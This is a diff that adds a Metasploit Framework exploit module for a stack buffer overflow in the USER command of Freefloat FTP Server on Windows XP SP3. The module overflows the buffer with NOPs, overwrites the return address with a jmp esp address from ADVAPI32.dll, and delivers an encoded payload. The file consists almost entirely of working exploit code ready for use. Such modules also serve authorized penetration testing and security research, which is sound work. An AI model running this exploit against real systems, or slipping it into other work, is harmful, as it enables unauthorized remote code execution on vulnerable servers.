@@ -1,0 +1,63 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = AverageRanking
+
+	include Msf::Exploit::Remote::Ftp
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Freefloat FTP Server Username Stack Overflow',
+			'Description'    => %q{
+					This module exploits a buffer overflow found in the USER command of the Freefloat FTP server.
+			},
+			'Author'         => [
+						'0v3r',		# Initial Discovery
+						'James Fitts'	# Metasploit Module
+					],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: $',
+			'References'     =>
+				[
+					[ 'URL', 'http://www.exploit-db.com/exploits/15689' ],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+				},
+			'Payload'        =>
+				{
+					'BadChars' => "\x00\x0a\x0d",
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Windows XP SP3', { 'Ret' => 0x77def069 } ], # jmp esp from ADVAPI32.dll
+				],
+			'DisclosureDate' => 'Dec 05 2010',
+			'DefaultTarget'	=> 0))
+	end
+
+	def exploit
+		connect
+
+		print_status("Trying target #{target.name}...")
+
+		buf = make_nops(230) + [target.ret].pack('V')
+		buf << make_nops(50)
+		buf << payload.encoded
+
+		send_cmd( ['USER', buf] , false )
+
+		handler
+		disconnect
+	end
+
+end
